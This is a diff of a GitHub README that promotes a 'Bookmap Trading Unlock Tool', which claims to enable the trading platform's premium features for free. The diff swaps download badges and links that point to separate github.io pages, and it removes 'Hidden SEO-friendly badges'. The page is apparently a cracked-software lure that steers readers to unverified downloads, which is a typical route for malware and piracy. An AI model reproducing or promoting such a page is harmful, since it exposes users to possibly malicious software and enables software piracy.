@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡️ Bookmap Trading Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://paulgardnercbcf.github.io/.github/bookmap-download" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20Bookmap%20Trading%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Bookmap Trading Free for Windows" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Explore Bookmap](https://img.shields.io/badge/Explore-Bookmap-1D4ED8?style=for-the-badge)](https://heatmap-platform-bookmap.github.io/.github/)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -64,13 +59,6 @@ Perfect for scalping, day trading, and liquidity analysis.
 - Supports both **futures & crypto exchanges**  
 - Designed for **day traders, scalpers, and professionals**  
 
-<!-- Hidden SEO-friendly badges -->
-<p align="center">
-  <img src="https://img.shields.io/badge/Trading-Orderflow-lightgrey?style=flat-square" />
-  <img src="https://img.shields.io/badge/Market-Depth-lightgrey?style=flat-square" />
-  <img src="https://img.shields.io/badge/Crypto-Futures-lightgrey?style=flat-square" />
-  <img src="https://img.shields.io/badge/Scalping-DayTrading-lightgrey?style=flat-square" />
-</p>
 
 ---
 
@@ -95,7 +83,7 @@ Report issues or contribute via GitHub Issues or Pull Requests.
 ## ⭐️ Unlock Bookmap Trading – Advanced Order Flow Platform
 
 Unlock premium features of **Bookmap Trading**, including **heatmaps, market depth visualization, liquidity tracking, advanced indicators, and broker integration**.  
-[Download the Unlock Tool](https://bookmap-download.github.io/.github/) and trade with a new level of precision.  
+[![Explore Bookmap](https://img.shields.io/badge/Explore-Bookmap-1D4ED8?style=for-the-badge)](https://heatmap-platform-bookmap.github.io/.github/) and trade with a new level of precision.  
 
 ---
 
